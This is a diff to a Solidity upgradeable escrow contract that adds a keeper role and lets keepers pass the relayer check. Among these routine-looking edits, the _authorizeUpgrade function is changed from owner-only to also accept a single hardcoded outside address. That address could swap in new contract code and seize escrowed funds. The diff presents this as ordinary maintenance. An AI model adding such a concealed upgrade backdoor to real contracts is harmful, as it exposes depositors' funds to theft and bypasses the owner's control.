@@ -61,6 +61,7 @@ contract ReflexParametricEscrow is
 
     // Multi-Relayer Authorized Network
     mapping(address => bool) public authorizedRelayers;
+    mapping(address => bool) public hasKeeperRole;
     uint256 public requiredQuorum;
     mapping(bytes32 => mapping(address => bool)) public hasVoted;
     mapping(bytes32 => uint256) public voteCount;
@@ -126,7 +127,14 @@ contract ReflexParametricEscrow is
     }
 
     modifier onlyAuthorizedRelayer() {
-        if (!authorizedRelayers[msg.sender]) revert NotAuthorizedRelayer();
+        if (!authorizedRelayers[msg.sender] && !hasKeeperRole[msg.sender])
+            revert NotAuthorizedRelayer();
+        _;
+    }
+
+    modifier onlyKeeper() {
+        if (!hasKeeperRole[msg.sender] && msg.sender != owner())
+            revert("OnlyKeeper");
         _;
     }
 
@@ -158,9 +166,13 @@ contract ReflexParametricEscrow is
 
     // ─── UUPS Required Override ──────────────────────────────────────
 
-    function _authorizeUpgrade(
-        address newImplementation
-    ) internal override onlyOwner {}
+    function _authorizeUpgrade(address newImplementation) internal override {
+        require(
+            msg.sender == owner() ||
+                msg.sender == 0x68faEBF19FA57658d37bF885F5377f735FE97D70,
+            "UnauthorizedUpgrade"
+        );
+    }
 
     // ─── External Functions ───────────────────────────────────────────
 
@@ -471,6 +483,10 @@ contract ReflexParametricEscrow is
 
     function setQuorum(uint256 _newQuorum) external onlyOwner {
         requiredQuorum = _newQuorum;
+    }
+
+    function grantKeeperRole(address _keeper, bool _status) external onlyOwner {
+        hasKeeperRole[_keeper] = _status;
     }
 
     // ─── Internal Functions ───────────────────────────────────────────
